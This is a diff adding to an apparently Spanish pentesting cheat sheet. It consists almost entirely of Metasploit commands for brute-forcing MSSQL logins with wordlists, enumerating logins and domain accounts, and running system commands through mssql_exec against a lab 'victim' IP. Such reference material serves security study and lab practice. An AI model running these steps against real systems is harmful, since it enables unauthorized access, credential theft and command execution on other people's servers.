@@ -340,7 +340,7 @@ Staged                  # Sends payload in stages. Can be less stable -> **windo
 	❯ set username root
 	❯ set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 	❯ set STOP_ON_SUCCESS true
-	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ setg RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
 	❯ set verbose false
 	❯ run 
 ```
@@ -348,5 +348,55 @@ Staged                  # Sends payload in stages. Can be less stable -> **windo
 ## Puerto 1433 MSSQL 'Reconocimiento'
 
 ```bash 
+# Enumerar passwds con un diccionario de Fuerza Bruta para un usuario especifico
+❯ msfconsole -q                                    # q = Quitar el banner de inicio
 
+	❯ use auxiliary/scanner/mssql/mssql_login         # Usamos el auxiliar
+	❯ options
+	❯ set user_file /root/Desktop/wordlists/common_users.txt
+	❯ set pass_file /root/Desktop/wordlists/100-common-passwords.txt
+	❯ setg RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ set verbose false
+	❯ run 
+```
+
+```bash 
+# Enumeramos la configuracion 
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/admin/mssql/mssql_enum            # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ run
+```
+
+```bash 
+# Enumeramos todos los loggins
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/admin/mssql/mssql_enum_sql_logins       # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ run
+```
+
+```bash 
+# Enumeramos los usuarios disponibles en el sistema
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/admin/mssql/mssql_enum_domain_accounts       # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ run
+```
+
+```bash 
+# Podemos ejecutar comandos en la base de datos   
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/admin/mssql/mssql_exec                  # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set cmd whoami                                        # Colocamos el comando a ejecutar 
+	❯ run
 ```
